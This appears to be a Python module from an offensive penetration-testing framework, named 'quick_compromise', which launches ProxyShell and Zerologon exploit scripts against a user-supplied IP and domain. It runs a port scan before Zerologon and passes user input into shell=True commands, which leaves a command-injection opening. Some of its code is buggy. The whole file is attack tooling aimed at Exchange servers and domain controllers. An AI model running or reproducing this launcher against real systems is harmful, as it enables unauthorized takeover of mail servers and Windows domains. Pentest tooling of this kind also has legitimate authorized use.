import subprocess
from core.module_base import ModuleBase
from colorama import Fore, Style, init
from utils.nmap import *




init()

##TODO: Veeam, nuclei templates/ zerologon
##DONE: zerologon
class Quick_compromise(ModuleBase):
    def __init__(self):
        super().__init__()
        self.name = "quick_compromise"
        self.options = {
            "ip" : None,
            "domain": None
        }
        self.actions = {
           "proxyshell": self.proxyshell,
           "zerologon": self.zerologon
        }
        self.color = Fore.LIGHTWHITE_EX


    def proxyshell(self):
        ip = self.options["ip"]
        domain = self.options["domain"]
        if not all([ip,domain]):
            print("You must set ip and domain for proxyshell")
            return
        
        command = f"python3 utils/common_vuln/proxyshell_rce.py -u https://{ip} -d administrator@{domain}"

        try:
            print(f"Runing Proxyshell exploit on {ip}")
            result = subprocess.run(command, shell=True, check=True, stderr=subprocess.PIPE)

            if result.check_returncode != 0:
                print(f"Error: {result.stderr}")
                return
            else:
                print(f"Success: {result.stdout}")
                return

        except Exception as e:
            print(f"Error: {e}")
            return
    ## give up to use it
    def zerologon(self):
        ip = self.options["ip"]
        bios_name = input("Please provde a valid BIOS-Name: ")
        ports = [445,135,139]

        if not all([ip,bios_name]):
            print("You must set ip and bios name")
            return 
        nmap_result = ports_scan(ip,ports)
        print("Scanning for open ports...")
        
        if nmap_result and "open" in nmap_result:
            print("\n [+] Ports detected as open, proceeding with Zerologon exploit...")
            command = f"python3 utils/common_vuln/zerologon.py {bios_name} {ip}"
            try:
                print(f"Running Zerologon exploit on {ip}")
                result = subprocess.run(command, shell=True, text=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)
                if result.returncode == 0:
                    print(f"{result.stdout}")
                else:
                    print(f"{result.stderr}")
            except Exception as e:
                print(f"Error: {e}")
            
        



